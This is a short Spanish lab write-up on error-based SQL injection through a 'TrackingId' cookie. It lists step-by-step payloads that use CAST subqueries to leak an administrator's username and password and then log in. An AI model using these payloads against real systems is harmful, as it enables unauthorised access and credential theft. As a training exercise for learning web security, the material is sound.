
Analizamos paso a paso cómo:

- Provocar un error de sintaxis añadiendo un carácter de comilla.
- Comentar el resto de la consulta para validarla sintácticamente.
- Utilizar subconsultas SQL combinadas con ‘**CAST**‘ para extraer información.
- Ajustar la consulta para obtener solo una fila y evitar errores de tipo.
- Filtrar primero el nombre de usuario del administrador y después su contraseña.

Finalmente, utilizamos la información exfiltrada para iniciar sesión como administrador, completando así con éxito el laboratorio

-----

Nos aprovecharemos del error que nos muestra la inyeccion, ya que al provocar el error nos puede arrojar informacion referente a la consulta dada

La cookie de session "TrackingId"  es vulnerable a SQLI

* Cookie: TrackingId=sS0Qz9nx8FBcjUMr'
* Cookie: TrackingId=sS0Qz9nx8FBcjUMr' order by 1-- -
* Cookie: TrackingId=sS0Qz9nx8FBcjUMr' union select NULL-- -
* Cookie: TrackingId=sS0Qz9nx8FBcjUMr' union select 'test'-- -
* Cookie: TrackingId=sS0Qz9nx8FBcjUMr' union select "test"-- -
* Cookie: TrackingId=sS0Qz9nx8FBcjUMr' or 1=1-- -
* Cookie: TrackingId=sS0Qz9nx8FBcjUMr' or 'a'='a'-- -
* Cookie: TrackingId=sS0Qz9nx8FBcjUMr' or 1=1-- -
* Cookie: TrackingId=sS0Qz9nx8FBcjUMr' or 1=cast((select 1) as INT)-- - (como si hicieramos el 1=1)
* Cookie: TrackingId=sS0Qz9nx8FBcjUMr' or 1=cast((select username from users) as INT)-- -
* Cookie: TrackingId=sS0Qz9nx8FBcjUMr' or 1=cast((select username from users limit 1) as INT)-- - (se lista el primer usuario)
* Cookie: TrackingId=sS0Qz9nx8FBcjUMr' or 1=cast((select password from users limit 1) as INT)-- - (se lista la primer password)


